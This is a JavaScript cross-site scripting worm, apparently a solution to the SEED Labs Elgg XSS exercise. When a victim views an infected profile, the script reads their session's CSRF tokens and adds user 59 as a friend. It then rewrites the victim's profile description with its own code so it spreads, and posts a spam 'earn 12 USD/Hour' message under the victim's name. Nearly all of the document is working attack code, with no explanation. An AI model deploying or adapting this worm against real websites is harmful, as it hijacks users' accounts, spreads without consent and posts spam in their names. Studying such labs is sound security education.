<script id="worm" type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+ts+token+token; //FILL IN

	//Create and send Ajax request to add friend
	if(elgg.session.user.guid!=59){
	Ajax = new XMLHttpRequest();
	Ajax.open("GET",sendurl,true);
	Ajax.setRequestHeader("Host","www.seed-server.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send();

	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

	sendurl = "http://www.seed-server.com/action/profile/edit"; //FILL IN
	var content = "__elgg_token=" + elgg.security.token.__elgg_token + ts + "&name=" + elgg.session.user.name + "&description="+wormCode+"&accesslevel[description]=1&briefdescription=I don't understand but I like this subject&accesslevel[briefdescription]=1&location=Melbourne&accesslevel[location]=1&interests=Reading&accesslevel[interests]=1&skills=None:)&accesslevel[skills]=1&contactemail=doomed@example.com&accesslevel[contactemail]=1&phone=0123456789&accesslevel[phone]=1&mobile=0123456789&accesslevel[mobile]=1&website=http://www.diy.com&accesslevel[website]=1&twitter=peace&accesslevel[twitter]=1&guid=" + elgg.session.user.guid; //FILL IN
	Ajax = new XMLHttpRequest();
	Ajax.open("POST", sendurl, true);
	Ajax.setRequestHeader("Host", "www.seed-server.com");
	Ajax.setRequestHeader("Content-Type",
	"application/x-www-form-urlencoded");
	Ajax.send(content);

	sendurl="http://www.seed-server.com/action/thewire/add"; //FILL IN
	content="__elgg_token="+elgg.security.token.__elgg_token+ts+"&body=To earn 12 USD/Hour(!), visit now http://www.seed-server.com/profile/"+elgg.session.user.name; //FILL IN
	Ajax=new XMLHttpRequest();
	Ajax.open("POST",sendurl,true);
	Ajax.setRequestHeader("Host","www.seed-server.com");
	Ajax.setRequestHeader("Content-Type",
	"application/x-www-form-urlencoded");
	Ajax.send(content);

	}
}
</script >